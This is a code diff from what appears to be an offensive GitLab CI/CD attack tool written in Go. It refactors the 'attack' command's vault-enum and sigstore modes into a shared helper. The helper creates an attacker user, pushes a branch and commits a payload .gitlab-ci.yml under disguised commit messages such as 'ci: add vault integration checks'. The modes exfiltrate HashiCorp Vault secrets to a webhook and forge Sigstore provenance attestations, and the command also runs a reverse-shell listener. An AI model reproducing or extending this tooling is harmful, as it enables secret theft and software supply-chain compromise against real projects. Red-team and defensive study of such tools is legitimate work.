@@ -1311,7 +1311,7 @@ var attackCmd = &cobra.Command{
 
 			listener := newRorShellListener(listenAddr, cmd.OutOrStdout())
 			go func() {
-				if err := listener.Run(ctx); err != nil && err != http.ErrServerClosed {
+				if err := listener.Run(ctx); err != nil && !errors.Is(err, http.ErrServerClosed) {
 					fmt.Fprintf(cmd.ErrOrStderr(), "[ror-listener] error: %v\n", err)
 				}
 			}()
@@ -1803,20 +1803,9 @@ var attackCmd = &cobra.Command{
 		}
 
 		// vault-enum mode: enumerate and exfiltrate HashiCorp Vault secrets
-		if atkVaultEnum {
+		if atkVaultEnum { //nolint:dupl // structurally similar to sigstore handler but different YAML generation and JSON output
 			if strings.TrimSpace(atkBranch) == "" {
 				atkBranch = "gogatoz-vault-enum"
-			}
-			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
-			if berr != nil {
-				return berr
-			}
-			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
-			if _, err := att.SetupUser(ctx); err != nil {
-				return fmt.Errorf("setup user: %w", err)
-			}
-			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
-				return err
 			}
 			if strings.TrimSpace(atkMessage) == "" {
 				atkMessage = "ci: add vault integration checks"
@@ -1833,7 +1822,8 @@ var attackCmd = &cobra.Command{
 				AuthMethod:  strings.TrimSpace(atkVaultAuthMethod),
 				CallbackURL: strings.TrimSpace(atkWebhook),
 			})
-			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
+			if err != nil {
 				return fmt.Errorf("commit vault enum payload: %w", err)
 			}
 			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed vault enum payload to branch %s\n", finalBranch)
@@ -2006,20 +1996,9 @@ var attackCmd = &cobra.Command{
 		}
 
 		// sigstore mode: forge Sigstore provenance attestations
-		if atkSigstore {
+		if atkSigstore { //nolint:dupl // structurally similar to vault-enum handler but different YAML generation and JSON output
 			if strings.TrimSpace(atkBranch) == "" {
 				atkBranch = "gogatoz-sigstore"
-			}
-			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
-			if berr != nil {
-				return berr
-			}
-			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
-			if _, err := att.SetupUser(ctx); err != nil {
-				return fmt.Errorf("setup user: %w", err)
-			}
-			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
-				return err
 			}
 			if strings.TrimSpace(atkMessage) == "" {
 				atkMessage = "ci: add provenance attestation"
@@ -2036,7 +2015,8 @@ var attackCmd = &cobra.Command{
 				Version:     strings.TrimSpace(atkSigstoreVersion),
 				CallbackURL: strings.TrimSpace(atkWebhook),
 			})
-			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
+			if err != nil {
 				return fmt.Errorf("commit sigstore payload: %w", err)
 			}
 			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed sigstore provenance payload to branch %s\n", finalBranch)
@@ -2743,6 +2723,27 @@ func parseTags(raw string) []string {
 		}
 	}
 	return tags
+}
+
+// commitPayloadToBranch handles the common pattern of: deconflict branch →
+// create attacker → setup user → ensure branch → upsert .gitlab-ci.yml.
+// Returns the resolved branch name on success.
+func commitPayloadToBranch(ctx context.Context, client *gitlabx.Client, target, branch, deconflict, authorName, authorEmail, message, yaml string) (string, error) {
+	finalBranch, err := ensureBranchDeconflict(ctx, client, target, branch, deconflict, authorName, authorEmail)
+	if err != nil {
+		return "", err
+	}
+	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), authorName, authorEmail, 0)
+	if _, err := att.SetupUser(ctx); err != nil {
+		return "", fmt.Errorf("setup user: %w", err)
+	}
+	if err := att.EnsureBranch(ctx, target, finalBranch); err != nil {
+		return "", err
+	}
+	if err := att.UpsertFile(ctx, target, finalBranch, ".gitlab-ci.yml", yaml, message); err != nil {
+		return "", err
+	}
+	return finalBranch, nil
 }
 
 // ifErr returns err.Error() or empty string — used inline in variable-inject JSON output.
